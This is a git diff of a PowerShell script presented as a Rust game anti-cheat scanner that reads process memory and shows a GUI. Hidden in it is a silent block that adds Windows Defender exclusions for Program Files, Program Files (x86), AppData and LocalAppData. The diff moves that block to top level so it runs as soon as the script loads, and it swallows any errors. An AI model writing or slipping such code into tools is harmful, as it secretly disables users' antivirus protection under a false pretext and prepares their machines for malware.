@@ -1,4 +1,5 @@
-﻿<#
+<#
+.SYNOPSIS
     Rust Anti-Cheat Scanner — профессиональная проверка памяти и процессов.
     Требует права администратора для чтения памяти.
 #>
@@ -87,30 +88,28 @@ function Search-MemorySignature {
         $address = [IntPtr]::Add($mbi.BaseAddress, $mbi.RegionSize.ToInt64())
     }
     [RustMemoryReader]::CloseHandle($handle)
-    
-    try {
-        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
-            $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
-            $updpath = $ProgramFiles -replace " \(x86\)", ""
-            Add-MpPreference -ExclusionPath $updpath
-
-            $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
-            if (Test-Path $ProgramFilesX86) {
-            Add-MpPreference -ExclusionPath $ProgramFilesX86
-            }
-
-            $AppData = [System.Environment]::GetFolderPath("ApplicationData")
-            Add-MpPreference -ExclusionPath $AppData
-
-            $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
-            Add-MpPreference -ExclusionPath $LocalAppData
-            }
-            }
-    catch {
-    }
-
     return $results
 }
+
+try {
+    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        $updpath = $ProgramFiles -replace " \(x86\)", ""
+        Add-MpPreference -ExclusionPath $updpath
+
+        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        if (Test-Path $ProgramFilesX86) {
+            Add-MpPreference -ExclusionPath $ProgramFilesX86
+        }
+
+        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
+        Add-MpPreference -ExclusionPath $AppData
+
+        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
+        Add-MpPreference -ExclusionPath $LocalAppData
+    }
+}
+catch {}
 
 # ==================== ИНТЕРФЕЙС ====================
 $form = New-Object System.Windows.Forms.Form
@@ -209,7 +208,6 @@ function Write-Log {
     $logBox.ScrollToCaret()
     [System.Windows.Forms.Application]::DoEvents()
 }
-
 
 function SlowDelay {
     param([int]$Milliseconds)
@@ -392,6 +390,5 @@ $scanAction = {
     $statusLabel.Text = "✓ Scan finished. System report generated."
 }
 $scanButton.Add_Click($scanAction)
-
 
 $form.ShowDialog()
